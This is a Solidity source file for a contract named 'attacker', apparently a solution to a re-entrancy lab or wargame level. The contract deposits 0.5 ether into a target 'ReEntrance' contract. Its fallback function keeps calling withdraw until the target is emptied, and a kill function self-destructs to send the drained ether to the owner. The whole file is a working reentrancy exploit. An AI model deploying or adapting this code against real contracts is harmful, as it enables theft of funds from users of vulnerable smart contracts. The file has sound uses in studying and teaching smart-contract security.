pragma solidity ^0.5.11;

import "./Reentrance.sol";

contract attacker {
    
    address payable public owner;
    ReEntrance public reEntrance;
    
    constructor(address payable _addr) public payable {
        owner = msg.sender;
        reEntrance = ReEntrance(_addr);
    }
    
    modifier onlyOwner {
        require(msg.sender == owner, "only owner can call this method");
        _;//!!!
    }
    
    function donate() external onlyOwner {
        reEntrance.donate.value(0.5 ether)(address(this));
    }
    
    function() external payable { // iterable fallback method
        if(address(reEntrance).balance > 0) {
            reEntrance.withdraw(0.5 ether);
        }
    }
    
    function kill() external onlyOwner {
        selfdestruct(owner);
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    
}